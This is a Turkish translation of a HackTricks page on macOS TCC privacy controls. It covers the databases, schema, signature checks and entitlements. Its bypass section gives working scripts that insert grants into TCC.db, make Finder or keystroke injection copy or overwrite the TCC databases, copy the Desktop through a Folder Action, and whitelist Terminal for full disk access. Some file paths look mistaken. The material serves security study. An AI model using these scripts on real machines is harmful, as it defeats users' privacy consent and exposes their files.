# macOS TCC

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## **Temel Bilgiler**

**TCC (Şeffaflık, Onay ve Kontrol)**, uygulama izinlerini düzenlemeye odaklanan bir güvenlik protokolüdür. Temel rolü, **konum hizmetleri, kişiler, fotoğraflar, mikrofon, kamera, erişilebilirlik ve tam disk erişimi** gibi hassas özellikleri korumaktır. TCC, bu unsurlara uygulama erişimini vermeden önce açık kullanıcı onayını zorunlu kılarak gizliliği artırır ve kullanıcıların verileri üzerinde kontrol sağlar.

Kullanıcılar, uygulamaların korunan özelliklere erişim istediğinde TCC ile karşılaşırlar. Bu, kullanıcılara **erişimi onaylama veya reddetme** seçeneği sunan bir uyarı aracılığıyla görünür hale gelir. Ayrıca, TCC, kullanıcıların **dosyaları bir uygulamaya sürükleyip bırakma** gibi doğrudan eylemlerini de destekler, böylece uygulamaların yalnızca açıkça izin verilenlere erişimi olduğundan emin olur.

![Bir TCC uyarı örneği](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**, `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` konumunda bulunan **daemon** tarafından işlenir ve `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` dosyasında yapılandırılır (`com.apple.tccd.system` mach servisini kaydeder).

Her oturum açılan kullanıcı için tanımlanan `/System/Library/LaunchAgents/com.apple.tccd.plist` dosyasında tanımlanan **kullanıcı modu tccd** çalışır ve `com.apple.tccd` ve `com.apple.usernotifications.delegate.com.apple.tccd` mach servislerini kaydeder.

Burada sistem olarak çalışan tccd'yi ve kullanıcı olarak çalışan tccd'yi görebilirsiniz:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
İzinler **ana uygulamadan miras alınır** ve **izinler** **Bundle ID** ve **Developer ID**'ye göre **izlenir**.

### TCC Veritabanları

İzinler daha sonra bazı TCC veritabanlarında saklanır:

- **`/Library/Application Support/com.apple.TCC/TCC.db`** içindeki sistem genelindeki veritabanı.
- Bu veritabanı **SIP korumalıdır**, bu yüzden yalnızca bir SIP atlatma işlemi yazabilir.
- Kullanıcı TCC veritabanı **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** kullanıcı tercihleri için.
- Bu veritabanı, yalnızca Tam Disk Erişimi gibi yüksek TCC ayrıcalıklarına sahip işlemler yazabilir (ancak SIP tarafından korunmaz).

{% hint style="warning" %}
Önceki veritabanları ayrıca **okuma erişimi için TCC korumalıdır**. Bu nedenle, düzenli kullanıcı TCC veritabanını yalnızca bir TCC ayrıcalıklı işlemden okuyamazsınız.

Ancak, bu yüksek ayrıcalıklara sahip bir işlem (FDA veya **`kTCCServiceEndpointSecurityClient`** gibi) kullanıcıların TCC veritabanını yazabilir.
{% endhint %}

- **Üçüncü** bir TCC veritabanı **`/var/db/locationd/clients.plist`** içinde, konum hizmetlerine **erişime izin verilen istemcileri** belirtmek için.
- SIP korumalı dosya **`/Users/carlospolop/Downloads/REG.db`** (ayrıca TCC ile okuma erişimine karşı korunur), tüm **geçerli TCC veritabanlarının konumunu** içerir.
- SIP korumalı dosya **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (ayrıca TCC ile okuma erişimine karşı korunur), daha fazla TCC verilen izni içerir.
- SIP korumalı dosya **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (herkes tarafından okunabilir) TCC istisnası gerektiren uygulamaların izin listesidir.

{% hint style="success" %}
**iOS**'taki TCC veritabanı **`/private/var/mobile/Library/TCC/TCC.db`** içindedir.
{% endhint %}

{% hint style="info" %}
**Bildirim merkezi UI**, **sistem TCC veritabanında değişiklikler yapabilir**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Ancak, kullanıcılar **`tccutil`** komut satırı yardımcı programı ile **kuralları silebilir veya sorgulayabilir**.
{% endhint %}

#### Veritabanlarını sorgulama

{% tabs %}
{% tab title="kullanıcı DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="sistem DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Her iki veritabanını da kontrol ederek bir uygulamanın izin verdiği, yasakladığı veya sahip olmadığı izinleri kontrol edebilirsiniz (izin isteyecektir).
{% endhint %}

- **`service`**, TCC **izin** dizesinin temsilidir
- **`client`**, izinlerle birlikte **bundle kimliği** veya **ikili yolu** dur
- **`client_type`**, bir Bundle Kimliği(0) mi yoksa mutlak bir yol mu(1) olduğunu belirtir

<details>

<summary>Absolut yol olduğunda nasıl yürütülür</summary>

Sadece **`launctl load you_bin.plist`** yapın, plist ile:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** farklı değerlere sahip olabilir: denied(0), unknown(1), allowed(2) veya limited(3).
* **`auth_reason`** aşağıdaki değerleri alabilir: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** alanı, yürütülecek olan ikili dosyayı doğrulamanın ve TCC izinlerini vermenin nasıl belirtileceğini göstermek için bulunmaktadır:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Tablonun **diğer alanları** hakkında daha fazla bilgi için [**bu blog yazısına**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive) göz atabilirsiniz.

Ayrıca, `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` bölümünden uygulamalara verilen **izinleri kontrol edebilirsiniz**.

{% hint style="success" %}
Kullanıcılar **`tccutil`** kullanarak **kuralları silebilir veya sorgulayabilir**.
{% endhint %}

#### TCC izinlerini sıfırlama
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC İmza Kontrolleri

TCC **veritabanı**, uygulamanın **Paket Kimliği**ni depolar, ancak aynı zamanda bir izni kullanmak için başvuran Uygulamanın doğru olduğundan emin olmak için **imza** hakkında **bilgi** de **saklar**.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Bu nedenle, aynı adı ve paket kimliğini kullanan diğer uygulamalar, diğer uygulamalara verilen izinlere erişemeyecektir.
{% endhint %}

### Yetkiler ve TCC İzinleri

Uygulamalar **sadece** bazı kaynaklara **erişim izni istemekle kalmaz**, aynı zamanda **ilgili yetkilere sahip olmalıdır**.\
Örneğin **Telegram**, kameraya **erişim istemek için** `com.apple.security.device.camera` yetkisine sahiptir. Bu **yetkiye sahip olmayan bir uygulama**, kameraya erişemez (ve kullanıcı izinleri bile sorulmaz).

Ancak, uygulamaların `~/Desktop`, `~/Downloads` ve `~/Documents` gibi **belirli kullanıcı klasörlerine erişmesi** için herhangi bir **özel yetkiye ihtiyaçları yoktur.** Sistem, erişimi şeffaf bir şekilde yönetecek ve gerektiğinde **kullanıcıya uyarı gösterecektir.**

Apple'ın uygulamaları **uyarılar oluşturmaz.** Onlar, **yetkilendirme listelerinde önceden verilmiş haklara** sahiptir, bu da **asla bir pencere açmayacakları** ve **TCC veritabanlarında görünmeyecekleri** anlamına gelir. Örneğin:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Bu, Takvim'in kullanıcıya hatırlatıcılar, takvim ve adres defterine erişim istemesini engelleyecektir.

{% hint style="success" %}
Yetkilendirmeler hakkında resmi belgelerin yanı sıra, [https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl) adresindeki **ilginç yetkilendirme bilgilerini** de bulmak mümkündür.
{% endhint %}

Bazı TCC izinleri şunlardır: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Tümünü tanımlayan genel bir liste yoktur, ancak bu [**bilinenlerin listesini**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) kontrol edebilirsiniz.

### Hassas korunmasız yerler

* $HOME (kendisi)
* $HOME/.ssh, $HOME/.aws, vb.
* /tmp

### Kullanıcı Niyeti / com.apple.macl

Daha önce belirtildiği gibi, bir dosyaya erişime izin vermek için onu bir uygulamaya sürükleyip bırakmak mümkündür. Bu erişim herhangi bir TCC veritabanında belirtilmeyecek, ancak dosyanın **uzatılmış bir özniteliği** olarak saklanacaktır. Bu öznitelik, izin verilen uygulamanın **UUID'sini saklayacaktır**:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
**`com.apple.macl`** özniteliğinin **Sandbox** tarafından yönetildiği, tccd tarafından değil, ilginçtir.

Ayrıca, bilgisayarınızdaki bir uygulamanın UUID'sine izin veren bir dosyayı farklı bir bilgisayara taşırsanız, çünkü aynı uygulamanın farklı UID'leri olacaktır, o uygulamaya erişim izni vermez.
{% endhint %}

`com.apple.macl` genişletilmiş özniteliği diğer genişletilmiş öznitelikler gibi **SIP tarafından korunduğu için** **temizlenemez**. Bununla birlikte, [bu yazıda açıklandığı gibi](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), dosyayı **sıkıştırarak**, **silmeyi** ve **sıkıştırılmış dosyayı açmayı** devre dışı bırakmak mümkündür.

## TCC Privesc & Bypasses

### TCC'ye Ekleme

Bir noktada TCC veritabanı üzerinde yazma erişimi elde ederseniz, aşağıdakine benzer bir şeyi eklemek için şunu kullanabilirsiniz (yorumları kaldırın):

<details>

<summary>TCC'ye Ekleme örneği</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Yükleri

Eğer bir uygulamaya bazı TCC izinleriyle girdiyseniz, bunları kötüye kullanmak için TCC yükleri sayfasına bakın:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple Olayları

Apple Olayları hakkında bilgi edinin:

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### Otomasyon (Finder) için FDA\*

Otomasyon izninin TCC adı: **`kTCCServiceAppleEvents`**\
Bu belirli TCC izni aynı zamanda TCC veritabanında **yönetilebilecek uygulamayı** da belirtir (bu nedenle izinler sadece her şeyi yönetmeye izin vermez).

**Finder**, **her zaman FDA'ya sahip olan** bir uygulamadır (UI'de görünmese bile), bu nedenle eğer üzerinde **Otomasyon** ayrıcalıklarınız varsa, bu ayrıcalıkları kötüye kullanarak **bazı işlemler yaptırabilirsiniz**.\
Bu durumda uygulamanızın **`com.apple.Finder`** üzerinde **`kTCCServiceAppleEvents`** iznine ihtiyacı olacaktır.

{% tabs %}
{% tab title="Kullanıcıların TCC.db'sini çalın" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Sistem TCC.db'yi çalma" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Bunu **kendi kullanıcı TCC veritabanınızı yazmak** için kullanabilirsiniz.

{% hint style="warning" %}
Bu izinle **finder'a TCC kısıtlı klasörlere erişim isteyebilir** ve dosyaları alabilirsiniz, ancak bildiğim kadarıyla Finder'ı **keyfi kod yürütmeye zorlayamazsınız** ve FDA erişimini tam olarak kötüye kullanamazsınız.

Bu nedenle, tam FDA yeteneklerini kötüye kullanamayacaksınız.
{% endhint %}

Bu, Finder üzerinde Otomasyon ayrıcalıklarını elde etmek için TCC istemidir:

<figure><img src="../../../../.gitbook/assets/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
**Automator** uygulamasının **`kTCCServiceAppleEvents`** TCC iznine sahip olması nedeniyle, Finder gibi herhangi bir uygulamayı **kontrol edebilir**. Bu nedenle, Automator'ı kontrol etme iznine sahip olduğunuzda aşağıdaki gibi bir kodla **Finder'ı** da kontrol edebilirsiniz:
{% endhint %}

<details>

<summary>Automator içinde bir kabuk alın</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</detaylar>

**Script Editor uygulaması** için aynı durum geçerlidir, Finder'ı kontrol edebilir, ancak bir AppleScript kullanarak bir betiği çalıştırmaya zorlayamazsınız.

### Otomasyon (SE) bazı TCC'lere

**Sistem Olayları** Klasör Eylemleri oluşturabilir ve Klasör eylemleri bazı TCC klasörlerine erişebilir (Masaüstü, Belgeler ve İndirmeler), bu nedenle aşağıdaki gibi bir betik bu davranışı kötüye kullanmak için kullanılabilir:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Otomasyon (SE) + Erişilebilirlik (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*

**`System Events`** üzerinde otomasyon + Erişilebilirlik (**`kTCCServicePostEvent`**) işlemlerine izin verir, bu sayede **işlemlere tuş vuruşları gönderilebilir**. Bu şekilde Finder'ı kötüye kullanarak kullanıcıların TCC.db dosyasını değiştirebilir veya FDA'yı herhangi bir uygulamaya verebilirsiniz (ancak bunun için şifre istenebilir).

Finder'ın kullanıcıların TCC.db dosyasını üzerine yazma örneği:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility`'dan FDA\*’a

[**Erişilebilirlik izinlerini kötüye kullanmak için bazı payloadlar**](macos-tcc-payloads.md#accessibility) için bu sayfaya bakın ve örneğin FDA\* için ayrıcalık yükseltme veya bir tuş kaydedici çalıştırma.

### **FDA için Endpoint Güvenlik İstemcisi**

Eğer **`kTCCServiceEndpointSecurityClient`**'e sahipseniz, FDA'ya sahipsiniz. Son.

### Sistem Politikası SysAdmin Dosyası için FDA

**`kTCCServiceSystemPolicySysAdminFiles`**, bir kullanıcının ev klasörünü değiştiren **`NFSHomeDirectory`** özniteliğini **değiştirmeyi** sağlar ve bu nedenle **TCC'yi atlaymanıza** olanak tanır.

### Kullanıcı TCC DB'si için FDA

Kullanıcı TCC veritabanı üzerinde **yazma izinleri** elde etmek, kendinize **`FDA`** izinleri veremez, yalnızca sistem veritabanında yaşayan kişi bunu sağlayabilir.

Ancak kendinize **`Finder için Otomasyon hakları`** verebilir ve FDA\*’a yükseltmek için önceki teknikten yararlanabilirsiniz.

### **FDA’dan TCC izinlerine**

**Tam Disk Erişimi** TCC adı **`kTCCServiceSystemPolicyAllFiles`**

Bu gerçek bir ayrıcalık yükseltme olduğunu düşünmüyorum, ancak yararlı bulabileceğinizi düşündüğüm bir durum: FDA'ya sahip bir programı kontrol ediyorsanız, **kullanıcıların TCC veritabanını değiştirebilir ve kendinize herhangi bir erişim verebilirsiniz**. Bu, FDA izinlerinizi kaybetme ihtimaliniz olduğunda kalıcılık tekniği olarak kullanışlı olabilir.

### **SIP Atlatma ile TCC Atlatma**

Sistem **TCC veritabanı**, **SIP** tarafından korunmaktadır, bu nedenle yalnızca belirtilen ayrıcalıklara sahip işlemler onu **değiştirebilecektir**. Bu nedenle, bir saldırgan bir **SIP atlatma** bulursa (SIP tarafından kısıtlanmış bir dosyayı değiştirebilme), şunları yapabilir:

* Bir TCC veritabanının korumasını **kaldırabilir** ve kendisine tüm TCC izinlerini verebilir. Örneğin bu dosyalardan herhangi birini kötüye kullanabilir:
* TCC sistem veritabanı
* REG.db
* MDMOverrides.plist

Ancak, bu **SIP atlatmayı TCC'yi atlatmak için kullanmanın başka bir seçeneği** var, `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` dosyası, TCC istisnası gerektiren uygulamaların bir izin listesidir. Bu nedenle, bir saldırgan bu dosyadan **SIP korumasını kaldırabilir** ve **kendi uygulamasını ekleyebilirse**, uygulama TCC'yi atlayabilir.\
Örneğin terminal eklemek için:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
```plaintext
AllowApplicationsList.plist:
```

```plaintext
AllowApplicationsList.plist:
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Atlatmaları

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referanslar

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
